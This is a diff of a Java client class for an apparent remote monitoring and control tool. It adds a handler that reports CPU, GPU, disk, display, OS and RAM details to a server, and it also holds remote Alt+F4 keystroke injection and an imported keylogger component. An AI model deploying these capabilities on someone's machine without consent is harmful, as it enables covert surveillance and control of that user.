@@ -2,18 +2,13 @@ package Client;
 
 import Control.KeyLogger;
 import Control.SendCommand;
-import Hardware.CPU_Usage;
-import UI.Disk_Usage;
+import Hardware.*;
 import Ultils.MessageType;
 import Ultils.NetUtils;
-import Ultils.OSUtils;
 import Ultils.Packet;
-import java.util.List;
 import com.github.kwhat.jnativehook.NativeHookException;
 import org.jfree.data.time.DynamicTimeSeriesCollection;
 import oshi.SystemInfo;
-import oshi.software.os.FileSystem;
-import oshi.software.os.OSFileStore;
 
 import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
@@ -54,7 +49,7 @@ public class ClientManager {
             }
         }
 
-        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()){
+        if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
             System.out.println("Received from server:" + packet.data);
             try {
                 if (packet.data.get(0).equals("start")) {
@@ -78,13 +73,17 @@ public class ClientManager {
                 System.out.println("Failed to process performance packet");
             }
             sendCpuUsage(pw);
-        }
-
-        else if (packet.action == MessageType.STORAGE_TRACK.getID()){
-           System.out.println("Storage Track");
-        }
-
-        else if (packet.action == MessageType.ALTF4.getID()) {
+        } else if (packet.action == MessageType.STORAGE_TRACK.getID()) {
+            System.out.println("Storage Track");
+        } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
+            System.out.println("Received request Hardware info");
+            SendCpuInfo(pw);
+            SendDiskInfo(pw);
+            SendDisplayInfo(pw);
+            SendGPUInfo(pw);
+            SendOSInfo(pw);
+            SendRAMInfo(pw);
+        } else if (packet.action == MessageType.ALTF4.getID()) {
             try {
                 Robot r = new Robot();
                 r.keyPress(KeyEvent.VK_ALT);
@@ -274,13 +273,91 @@ public class ClientManager {
         }
     }
 
-    public String getSeparator() {
-        return "|}";
+    public void SendCpuInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("cpu");
+        packet.data.add(CPU.getCpuInformation());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending cpu info " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send CPU info");
+        }
     }
 
-    public  static  void main(String[] args)
-    {
-        PrintWriter pw = null;
-        sendCpuUsage(pw);
+    public void SendGPUInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("gpu");
+        packet.data.add(GPU.GetGPUInformation().toString());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending gpu info " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send GPU info");
+        }
+    }
+
+    public void SendDiskInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("disk");
+        packet.data.add(Disk.GetDiskInfo());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending disk info " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send disk info");
+        }
+    }
+
+    public void SendDisplayInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("display");
+        packet.data.add(DisplayInfo.GetAllDisplayInformation());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending display info " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send display info");
+        }
+    }
+
+    public void SendOSInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("os");
+        packet.data.add(OS.GetOSVersionInfo());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending os info: " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send OS info");
+        }
+    }
+
+    public void SendRAMInfo(PrintWriter pw) {
+        Packet packet = new Packet();
+        packet.action = MessageType.HARDWARE_INFO.getID();
+        packet.data = new ArrayList<>();
+        packet.data.add("ram");
+        packet.data.add(RAM.GetPhysicalMemory());
+        try {
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending ram info: " + packet.data);
+        } catch (Exception e) {
+            System.out.println("Failed to send RAM info");
+        }
+    }
+
+    public String getSeparator() {
+        return "|}";
     }
 }
